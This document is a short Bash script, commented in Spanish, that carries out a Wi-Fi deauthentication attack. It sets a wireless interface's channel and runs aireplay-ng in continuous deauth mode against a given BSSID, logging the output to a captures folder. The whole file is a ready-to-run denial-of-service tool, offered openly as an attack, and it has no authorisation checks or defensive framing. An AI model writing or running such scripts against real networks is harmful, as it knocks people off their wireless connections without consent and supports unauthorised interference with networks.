#!/bin/bash

# WIFI DEAUTH - Ataque de desautenticación
# Uso: ./wifi_deauth.sh <INTERFACE> <BSSID> <CHANNEL>
# Ejemplo: ./wifi_deauth.sh wlan0mon 00:11:22:33:44:55 6

INTERFACE="$1"
BSSID="$2"
CHANNEL="$3"
OUTPUT_DIR="../captures/logs"

if [[ -z "$INTERFACE" ]] || [[ -z "$BSSID" ]] || [[ -z "$CHANNEL" ]]; then
    echo "Uso: ./wifi_deauth.sh <INTERFACE> <BSSID> <CHANNEL>"
    echo "Ejemplo: ./wifi_deauth.sh wlan0mon 00:11:22:33:44:55 6"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "💥 Ataque de desautenticación"
echo "────────────────────────────────────────"
echo " INTERFACE: $INTERFACE"
echo " BSSID: $BSSID"
echo " CANAL: $CHANNEL"
echo ""

# Configurar canal
sudo iw dev "$INTERFACE" set channel "$CHANNEL"

# Iniciar ataque
echo " → Enviando paquetes de desautenticación..."
echo " (presiona Ctrl+C para detener)"
sudo aireplay-ng -0 0 -a "$BSSID" "$INTERFACE" 2>/dev/null | tee "$OUTPUT_DIR/deauth_$(date +%Y%m%d_%H%M%S).log"
